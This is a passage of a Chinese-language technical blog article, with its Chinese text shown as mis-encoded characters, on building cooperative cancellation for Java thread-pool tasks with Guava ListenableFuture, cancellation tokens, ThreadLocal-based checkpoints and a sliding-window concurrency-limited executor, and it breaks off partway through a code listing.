                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>è¿™ç¯‡æ–‡ç« ä¸»è¦æ ¹æ®æˆ‘æœ€è¿‘åšçš„çº¿ç¨‹æ± ä»»åŠ¡æ”¯æŒåä½œå¼å–æ¶ˆåŠŸèƒ½å†™çš„ï¼Œä»£ç ä¸­å¯èƒ½æ¶‰åŠä¸€äº›æ— å…³å†…å®¹ï¼Œè¯·é…Œæƒ…å¿½ç•¥ã€‚å†…å®¹æ¶‰åŠï¼š</p>
<ol>
<li>é‡åº¦ä¾èµ– <code>ListenableFuture</code> å®ç°å–æ¶ˆæœºåˆ¶</li>
<li>ä½¿ç”¨ <code>TTL/ThreadLocal</code> å®ç°ä¸Šä¸‹æ–‡ä¼ æ’­(å®é™…ä¸Šï¼Œå¦‚æœèƒ½æ‰‹åŠ¨æ˜¾å¼ä¼ é€’ä¸Šä¸‹æ–‡æœ€å¥½ï¼‰</li>
<li>ä¹‹å‰æ–‡ç« æåˆ°çš„å¹¶å‘åº¦æ§åˆ¶ä¹Ÿæ”¯æŒäº†å–æ¶ˆæœºåˆ¶</li>
<li>èµ„æºæ¸…ç†</li>
</ol>
<p>ä¸ºäº†ä½¿é—®é¢˜ä¸è¿‡äºå¤æ‚ï¼Œåˆ é™¤äº†å…³äºåµŒå¥—å–æ¶ˆä¼ æ’­çš„å†…å®¹ï¼Œä¸‹ç¯‡æ–‡ç« ä¼šè°ˆåˆ°ï¼Œæ•¬è¯·æœŸå¾…ã€‚</p>
</blockquote>
<h2 data-id="heading-0">èƒŒæ™¯</h2>
<p>åœ¨é«˜å¹¶å‘ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦å¹¶è¡Œæ‰§è¡Œå¤§é‡å­ä»»åŠ¡ã€‚ç„¶è€Œï¼Œå½“å‡ºç°ä»¥ä¸‹æƒ…å†µæ—¶ï¼Œç»§ç»­æ‰§è¡Œå‰©ä½™ä»»åŠ¡å¾€å¾€æ˜¯èµ„æºæµªè´¹ï¼š</p>
<ol>
<li><strong>è¶…æ—¶</strong>ï¼šæ€»ä½“ä»»åŠ¡å·²è¶…æ—¶ï¼Œç»§ç»­æ‰§è¡Œæ— æ„ä¹‰</li>
<li><strong>å¿«é€Ÿå¤±è´¥ï¼ˆFail-Fastï¼‰</strong>ï¼šæŸä¸ªå­ä»»åŠ¡å¼‚å¸¸ï¼Œæ•´æ‰¹ä»»åŠ¡ç»“æœå·²ä¸å¯ç”¨</li>
<li><strong>ä¸»åŠ¨å–æ¶ˆ</strong>ï¼šä¸šåŠ¡é€»è¾‘åˆ¤æ–­ä¸å†éœ€è¦ç»“æœ</li>
</ol>
<p>Java åŸç”Ÿçš„ <code>Thread.interrupt()</code> åªèƒ½ä¸­æ–­é˜»å¡æ“ä½œï¼ˆå¦‚ <code>sleep</code>ã€<code>wait</code>ã€<code>BlockingQueue.take</code>ï¼‰ï¼Œæ— æ³•ä¸­æ–­æ­£åœ¨æ‰§è¡Œ CPU å¯†é›†å‹ä»£ç çš„çº¿ç¨‹ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦è®¾è®¡ä¸€å¥—<strong>åä½œå¼å–æ¶ˆæœºåˆ¶ï¼ˆCooperative Cancellationï¼‰</strong>ã€‚</p>
<h2 data-id="heading-1">è®¾è®¡ç›®æ ‡</h2>
<ol>
<li><strong>ç»Ÿä¸€çš„å–æ¶ˆä¿¡å·ä¼ é€’</strong>ï¼šæ‰€æœ‰å¹¶è¡Œå­ä»»åŠ¡å…±äº«åŒä¸€ä¸ªå–æ¶ˆä»¤ç‰Œ</li>
<li><strong>æ”¯æŒå¤šç§å–æ¶ˆåŸå› </strong>ï¼šè¶…æ—¶ã€å¼‚å¸¸ã€ä¸»åŠ¨å–æ¶ˆ</li>
<li><strong>è½»é‡çº§æ£€æŸ¥ç‚¹</strong>ï¼šä»»åŠ¡å¯ä»¥åœ¨å…³é”®èŠ‚ç‚¹ä¸»åŠ¨æ£€æŸ¥å–æ¶ˆçŠ¶æ€</li>
<li><strong>å»¶è¿Ÿç»‘å®š</strong>ï¼šå–æ¶ˆä»¤ç‰Œåœ¨ä»»åŠ¡æäº¤åæ‰ç»‘å®šå®é™…çš„ Future</li>
<li><strong>èµ„æºè‡ªåŠ¨é‡Šæ”¾</strong>ï¼šå–æ¶ˆåè‡ªåŠ¨æ¸…ç†æœªå®Œæˆä»»åŠ¡</li>
</ol>
<h2 data-id="heading-2">æ ¸å¿ƒç»„ä»¶è®¾è®¡</h2>
<h3 data-id="heading-3">1. CancellationTokenState - å–æ¶ˆçŠ¶æ€æšä¸¾</h3>
<p>é¦–å…ˆå®šä¹‰æ¸…æ™°çš„çŠ¶æ€æšä¸¾ï¼Œé¿å…é­”æ³•æ•°å­—ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">CancellationTokenState</span> {
    <span class="hljs-comment">/** ä»»åŠ¡æ­£åœ¨è¿è¡Œ */</span>
    RUNNING(<span class="hljs-number">0</span>),
    <span class="hljs-comment">/** ä»»åŠ¡æˆåŠŸå®Œæˆ */</span>
    SUCCESS(<span class="hljs-number">1</span>),
    <span class="hljs-comment">/** ç©ºæ“ä½œ */</span>
    NO_OP(<span class="hljs-number">2</span>),
    <span class="hljs-comment">/** å› å…¶ä»–ä»»åŠ¡å¼‚å¸¸è€Œå–æ¶ˆï¼ˆå¿«é€Ÿå¤±è´¥ï¼‰ */</span>
    FAIL_FAST_CANCELLED(-<span class="hljs-number">1</span>),
    <span class="hljs-comment">/** å› è¶…æ—¶è€Œå–æ¶ˆ */</span>
    TIMEOUT_CANCELLED(-<span class="hljs-number">2</span>),
    <span class="hljs-comment">/** å› ä¸»åŠ¨è°ƒç”¨ cancel() è€Œå–æ¶ˆ */</span>
    MUTUAL_CANCELLED(-<span class="hljs-number">3</span>);

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> value;

    <span class="hljs-comment">/**
     * åˆ¤æ–­æ˜¯å¦éœ€è¦å–æ¶ˆå­ä»»åŠ¡
     * è´Ÿå€¼çŠ¶æ€è¡¨ç¤ºéœ€è¦å–æ¶ˆ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">shouldCancelSubtasks</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.value &lt; <span class="hljs-number">0</span>;
    }
}
</code></pre>
<p><strong>è®¾è®¡è¦ç‚¹</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨æ­£å€¼è¡¨ç¤ºæ­£å¸¸çŠ¶æ€ï¼Œè´Ÿå€¼è¡¨ç¤ºå–æ¶ˆçŠ¶æ€</li>
<li><code>shouldCancelSubtasks()</code> æ–¹æ³•æä¾›è¯­ä¹‰åŒ–çš„åˆ¤æ–­æ¥å£</li>
</ul>
<h3 data-id="heading-4">2. CancellationToken - å–æ¶ˆä»¤ç‰Œ</h3>
<p>å–æ¶ˆä»¤ç‰Œæ˜¯æ•´ä¸ªæœºåˆ¶çš„æ ¸å¿ƒï¼Œè´Ÿè´£ï¼š</p>
<ul>
<li>è·Ÿè¸ªä»»åŠ¡æ‰¹æ¬¡çš„æ•´ä½“çŠ¶æ€</li>
<li>ä¼ é€’å–æ¶ˆä¿¡å·</li>
<li>æ”¯æŒå»¶è¿Ÿç»‘å®š</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CancellationToken</span> {
    <span class="hljs-comment">// ä½¿ç”¨ SettableFuture æ”¯æŒå»¶è¿Ÿç»‘å®š</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> SettableFuture&lt;Object&gt; futureToken = SettableFuture.create();
    <span class="hljs-comment">// åŸå­çŠ¶æ€ï¼Œä¿è¯çº¿ç¨‹å®‰å…¨</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AtomicReference&lt;CancellationTokenState&gt; state =
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;(RUNNING);

    <span class="hljs-comment">/**
     * å»¶è¿Ÿç»‘å®šï¼šåœ¨ä»»åŠ¡æäº¤åç»‘å®šå®é™…çš„ Future
     *
     * <span class="hljs-doctag">@param</span> futures æ‰€æœ‰å­ä»»åŠ¡çš„ Future åˆ—è¡¨
     * <span class="hljs-doctag">@param</span> timeout è¶…æ—¶æ—¶é—´
     * <span class="hljs-doctag">@param</span> submitCanceller æäº¤å™¨çš„å–æ¶ˆ Future
     */</span>
    <span class="hljs-meta">@SuppressWarnings({"unchecked", "raw"})</span>
    <span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">lateBind</span><span class="hljs-params">(List&lt;ListenableFuture&lt;T&gt;&gt; futures,
                             Duration timeout,
                             ListenableFuture&lt;?&gt; submitCanceller)</span> {
        <span class="hljs-comment">// å¿«é€Ÿå¤±è´¥ Futureï¼šä»»ä½•ä¸€ä¸ªä»»åŠ¡å¤±è´¥éƒ½ä¼šè§¦å‘</span>
        FluentFuture&lt;?&gt; failFastFuture = FluentFuture.from(Futures.allAsList(futures))
                .catchingAsync(Throwable.class,
                    ex -&gt; Futures.immediateCancelledFuture(), directExecutor())
                .withTimeout(timeout, TimerService.getTimer());

        <span class="hljs-comment">// æ‰€æœ‰ä»»åŠ¡çš„ç»„åˆ Future</span>
        ListenableFuture&lt;?&gt; allFutures = Futures.successfulAsList(
            Futures.successfulAsList(futures), submitCanceller);

        <span class="hljs-comment">// ç›‘å¬å¿«é€Ÿå¤±è´¥ Future çš„å®Œæˆäº‹ä»¶</span>
        failFastFuture.addCallback(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FutureCallback</span>() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(Object result)</span> {
                state.compareAndSet(RUNNING, SUCCESS);
            }

            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onFailure</span><span class="hljs-params">(Throwable t)</span> {
                <span class="hljs-comment">// å–æ¶ˆæ‰€æœ‰ä»»åŠ¡</span>
                allFutures.cancel(<span class="hljs-literal">true</span>);
                <span class="hljs-comment">// æ ¹æ®å¼‚å¸¸ç±»å‹è®¾ç½®çŠ¶æ€</span>
                <span class="hljs-keyword">if</span> (t <span class="hljs-keyword">instanceof</span> TimeoutException) {
                    state.compareAndSet(RUNNING, TIMEOUT_CANCELLED);
                } <span class="hljs-keyword">else</span> {
                    state.compareAndSet(RUNNING, FAIL_FAST_CANCELLED);
                }
            }
        }, directExecutor());

        <span class="hljs-comment">// ç»‘å®šåˆ° futureToken</span>
        futureToken.setFuture(failFastFuture);
    }

    <span class="hljs-comment">/**
     * ä¸»åŠ¨å–æ¶ˆ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancel</span><span class="hljs-params">(<span class="hljs-type">boolean</span> useInterrupt)</span> {
        state.compareAndSet(RUNNING, MUTUAL_CANCELLED);
        futureToken.cancel(useInterrupt);
    }

    <span class="hljs-keyword">public</span> CancellationTokenState <span class="hljs-title function_">checkState</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> state.get();
    }
}
</code></pre>
<p><strong>å…³é”®è®¾è®¡</strong>ï¼š</p>
<ol>
<li>
<p><strong>å»¶è¿Ÿç»‘å®šï¼ˆLate Bindingï¼‰</strong>ï¼š<code>SettableFuture</code> å…è®¸å…ˆåˆ›å»º Tokenï¼Œåç»‘å®šå®é™… Futureï¼Œè§£å†³"å…ˆæœ‰é¸¡è¿˜æ˜¯å…ˆæœ‰è›‹"é—®é¢˜</p>
</li>
<li>
<p><strong>å¿«é€Ÿå¤±è´¥è¯­ä¹‰</strong>ï¼šä½¿ç”¨ <code>Futures.allAsList()</code> + <code>catchingAsync</code> å®ç°â€”â€”åªè¦æœ‰ä¸€ä¸ªä»»åŠ¡å¤±è´¥ï¼Œç«‹å³è§¦å‘å–æ¶ˆ</p>
</li>
<li>
<p><strong>è¶…æ—¶æ§åˆ¶</strong>ï¼š<code>withTimeout()</code> è®¾ç½®è¶…æ—¶ï¼Œè¶…æ—¶åè§¦å‘ <code>TimeoutException</code></p>
</li>
</ol>
<h3 data-id="heading-5">3. Checkpoints - æ£€æŸ¥ç‚¹æœºåˆ¶</h3>
<p>ç”±äºæ— æ³•å¼ºåˆ¶ä¸­æ–­ CPU å¯†é›†å‹ä»£ç ï¼Œæˆ‘ä»¬åœ¨ä»»åŠ¡ä»£ç ä¸­æ’å…¥"æ£€æŸ¥ç‚¹"ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Checkpoints</span> {

    <span class="hljs-comment">/**
     * æ ‡å‡†æ£€æŸ¥ç‚¹ï¼šæ£€æŸ¥ cancelToken çŠ¶æ€
     * å¦‚æœä»»åŠ¡å·²å–æ¶ˆï¼ŒæŠ›å‡ºå–æ¶ˆå¼‚å¸¸
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkpoint</span><span class="hljs-params">(String taskName, <span class="hljs-type">boolean</span> lean)</span> {
        <span class="hljs-type">ParallelOptions</span> <span class="hljs-variable">options</span> <span class="hljs-operator">=</span> TaskScopeTl.getParallelOptions();
        <span class="hljs-keyword">if</span> (taskName == <span class="hljs-literal">null</span> || options == <span class="hljs-literal">null</span>
                || <span class="hljs-string">"task"</span>.equals(options.getTaskName())
                || !taskName.equals(options.getTaskName())) {
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-type">CancellationToken</span> <span class="hljs-variable">cancelToken</span> <span class="hljs-operator">=</span> TaskScopeTl.getCancellationToken();
        <span class="hljs-keyword">if</span> (cancelToken != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">if</span> (cancelToken.checkState().shouldCancelSubtasks()) {
                <span class="hljs-keyword">throw</span> lean
                    ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">LeanCancellationException</span>(<span class="hljs-string">"Cancel during running"</span>)
                    : <span class="hljs-keyword">new</span> <span class="hljs-title class_">FatCancellationException</span>(<span class="hljs-string">"Cancel during running"</span>);
            }
        }
    }

    <span class="hljs-comment">/**
     * åŸå§‹æ£€æŸ¥ç‚¹ï¼šåªæ£€æŸ¥çº¿ç¨‹ä¸­æ–­æ ‡å¿—
     * é€‚ç”¨äºä¸ä½¿ç”¨ cancelToken çš„åœºæ™¯
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rawCheckpoint</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (Thread.interrupted()) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FatCancellationException</span>(<span class="hljs-string">"Cancel by interruption"</span>);
        }
    }
}
</code></pre>
<p><strong>ä¸¤ç§å–æ¶ˆå¼‚å¸¸</strong>ï¼š</p>
<ul>
<li><code>FatCancellationException</code>ï¼šå¸¦å®Œæ•´å †æ ˆï¼Œä¾¿äºè°ƒè¯•</li>
<li><code>LeanCancellationException</code>ï¼šæ— å †æ ˆï¼Œç”Ÿäº§ç¯å¢ƒå‡å°‘å¼€é”€</li>
</ul>
<h3 data-id="heading-6">4. ScopedCallable - å¸¦ä½œç”¨åŸŸçš„ Callable åŒ…è£…å™¨</h3>
<p>åŒ…è£…åŸå§‹ä»»åŠ¡ï¼Œæ·»åŠ ä¸Šä¸‹æ–‡ç»‘å®šå’Œç›‘æ§èƒ½åŠ›ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScopedCallable</span>&lt;V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Callable</span>&lt;V&gt;, Attachable {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_PARALLEL_OPTIONS</span> <span class="hljs-operator">=</span> <span class="hljs-string">"parallelOptions"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_CANCELLATION_TOKEN</span> <span class="hljs-operator">=</span> <span class="hljs-string">"cancellationToken"</span>;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String taskName;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Callable&lt;V&gt; delegate;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ConcurrentMap&lt;String, Object&gt; attachments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> V <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 1. å‡†å¤‡ä¸Šä¸‹æ–‡ï¼šç»‘å®š CancellationToken åˆ° ThreadLocal</span>
        TaskScopeTl.init(getCancellationToken(), getParallelOptions());
        TaskPair.init(taskName);

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 2. æ‰§è¡Œæ£€æŸ¥ç‚¹ï¼ˆä»»åŠ¡å¼€å§‹å‰æ£€æŸ¥ï¼‰</span>
            Checkpoints.checkpoint(taskName, <span class="hljs-literal">true</span>);
            startTime = ticker.read();
            <span class="hljs-comment">// 3. æ‰§è¡Œå®é™…ä»»åŠ¡</span>
            <span class="hljs-keyword">return</span> delegate.call();
        } <span class="hljs-keyword">finally</span> {
            endTime = ticker.read();
            <span class="hljs-comment">// 4. æ¸…ç†ä¸Šä¸‹æ–‡</span>
            TaskScopeTl.remove();
            <span class="hljs-comment">// 5. è®°å½•ç›‘æ§æŒ‡æ ‡</span>
            recordMetrics();
        }
    }
}
</code></pre>
<p><strong>è®¾è®¡è¦ç‚¹</strong>ï¼š</p>
<ul>
<li>é€šè¿‡ <code>Attachable</code> æ¥å£æ”¯æŒä»»æ„ä¸Šä¸‹æ–‡ä¼ é€’</li>
<li>ä»»åŠ¡æ‰§è¡Œå‰è‡ªåŠ¨è°ƒç”¨æ£€æŸ¥ç‚¹</li>
<li>ä½¿ç”¨ <code>ThreadLocal</code> ä¼ é€’å–æ¶ˆä»¤ç‰Œï¼Œå­æ–¹æ³•å¯éšæ—¶æ£€æŸ¥</li>
</ul>
<h3 data-id="heading-7">5. ConcurrentLimitExecutor - å¹¶å‘é™åˆ¶æ‰§è¡Œå™¨</h3>
<p>æ§åˆ¶åŒæ—¶æ‰§è¡Œçš„ä»»åŠ¡æ•°é‡ï¼Œå®ç°"æ»‘åŠ¨çª—å£"æäº¤ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcurrentLimitExecutor</span>&lt;V&gt; {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ExecutorCompletionService&lt;V&gt; cs;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> BlockingQueue&lt;ListenableFuture&lt;V&gt;&gt; blockingQueue =
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ParallelOptions options;

    <span class="hljs-comment">/**
     * æäº¤æ‰€æœ‰ä»»åŠ¡ï¼Œç«‹å³è¿”å› Future åˆ—è¡¨
     */</span>
    <span class="hljs-keyword">public</span> AsyncBatchResult&lt;V&gt; <span class="hljs-title function_">submitAll</span><span class="hljs-params">(List&lt;? extends Callable&lt;V&gt;&gt; tasks)</span> {
        Builder&lt;ListenableFuture&lt;V&gt;&gt; resultBuilder =
            ImmutableList.builderWithExpectedSize(tasks.size());

        <span class="hljs-comment">// 1. ç«‹å³æäº¤åˆå§‹æ‰¹æ¬¡ï¼ˆæ•°é‡ = å¹¶è¡Œåº¦ï¼‰</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> Math.min(tasks.size(), options.getParallelism());
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; start; i++) {
            resultBuilder.add(fallbackSubmit(tasks, i));
        }

        <span class="hljs-type">int</span> <span class="hljs-variable">remaining</span> <span class="hljs-operator">=</span> tasks.size() - start;
        <span class="hljs-keyword">if</span> (remaining &lt;= <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> AsyncBatchResult.&lt;V&gt;builder()
                    .results(resultBuilder.build())
                    .build();
        }

        <span class="hljs-comment">// 2. ä¸ºå‰©ä½™ä»»åŠ¡åˆ›å»º SettableFuture å ä½</span>
        List&lt;SettableFuture&lt;V&gt;&gt; others = IntStream.range(<span class="hljs-number">0</span>, remaining)
                .mapToObj(ignore -&gt; SettableFuture.&lt;V&gt;create())
                .collect(toImmutableList());

        ImmutableList&lt;ListenableFuture&lt;V&gt;&gt; results =
            resultBuilder.addAll(others).build();

        <span class="hljs-comment">// 3. å¼‚æ­¥æäº¤å‰©ä½™ä»»åŠ¡ï¼ˆåœ¨ç‹¬ç«‹çº¿ç¨‹ä¸­ï¼‰</span>
        ListenableFuture&lt;?&gt; submittingFuture =
            TimerService.getTimer().submit(() -&gt; submitRemaining(tasks, results, start));

        <span class="hljs-keyword">return</span> AsyncBatchResult.&lt;V&gt;builder()
                .submitCanceller(submittingFuture)
                .results(results)
                .build();
    }

    <span class="hljs-comment">/**
     * æäº¤å‰©ä½™ä»»åŠ¡ï¼ˆåœ¨ç‹¬ç«‹çº¿ç¨‹æ‰§è¡Œï¼‰
     * ç­‰å¾…ä¸€ä¸ªå®Œæˆ -&gt; æäº¤ä¸‹ä¸€ä¸ª
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">submitRemaining</span><span class="hljs-params">(List&lt;? extends Callable&lt;V&gt;&gt; tasks,
                                List&lt;ListenableFuture&lt;V&gt;&gt; result,
                                <span class="hljs-type">int</span> start)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> start;
        <span class="hljs-keyword">while</span> (index &lt; tasks.size()) {
            <span class="hljs-comment">// é˜»å¡ç­‰å¾…ä»»ä½•ä¸€ä¸ªä»»åŠ¡å®Œæˆ</span>
            ListenableFuture&lt;V&gt; completed = blockingQueue.take();

            <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å·²å–æ¶ˆ</span>
            <span class="hljs-keyword">if</span> (completed.isCancelled() || result.get(index).isCancelled()
                    || Thread.interrupted()) {
                <span class="hljs-keyword">return</span> submitted;
            }

            <span class="hljs-comment">// æäº¤ä¸‹ä¸€ä¸ªä»»åŠ¡ï¼Œç»‘å®šåˆ°å¯¹åº”ä½ç½®çš„ SettableFuture</span>
            ((SettableFuture&lt;V&gt;) result.get(index))
                .setFuture(fallbackSubmit(tasks, index));
            index++;
        }
        <span class="hljs-keyword">return</span> submitted;
    }
}
</code></pre>
<p><strong>æ»‘åŠ¨çª—å£æœºåˆ¶</strong>ï¼š</p>
<ol>
<li>åˆå§‹æäº¤ N ä¸ªä»»åŠ¡ï¼ˆN = å¹¶è¡Œåº¦ï¼‰</li>
<li>ç­‰å¾…ä»»ä½•ä¸€ä¸ªå®Œæˆï¼Œé‡Šæ”¾ä¸€ä¸ª"æ§½ä½"</li>
<li>æäº¤ä¸‹ä¸€ä¸ªä»»åŠ¡</li>
<li>é‡å¤ç›´åˆ°æ‰€æœ‰ä»»åŠ¡æäº¤å®Œæˆ</li>
</ol>
<h2 data-id="heading-8">æ•´ä½“æµç¨‹</h2>
<p>ä¸‹é¢æ˜¯ <code>FlightParallelHelper.parMap</code> çš„å®Œæ•´æµç¨‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T, R&gt; AsyncBatchResult&lt;R&gt; <span class="hljs-title function_">parMap</span><span class="hljs-params">(
        List&lt;T&gt; list,
        Function&lt;? <span class="hljs-built_in">super</span> T, ? extends R&gt; function,
        ParallelOptions options,
        ListeningExecutorService executor,
        String executorName)</span> {

    <span class="hljs-keyword">if</span> (CollectionUtils.isEmpty(list)) {
        <span class="hljs-keyword">return</span> emptyBatchResult();
    }

    <span class="hljs-comment">// 1. è§„èŒƒåŒ–å‚æ•°</span>
    <span class="hljs-type">ParallelOptions</span> <span class="hljs-variable">normalizedOptions</span> <span class="hljs-operator">=</span> ParallelOptions.formalized(options, list.size());
    <span class="hljs-type">String</span> <span class="hljs-variable">taskName</span> <span class="hljs-operator">=</span> normalizedOptions.getTaskName();

    <span class="hljs-comment">// 2. åˆ›å»ºå–æ¶ˆä»¤ç‰Œï¼ˆæ­¤æ—¶æœªç»‘å®š Futureï¼‰</span>
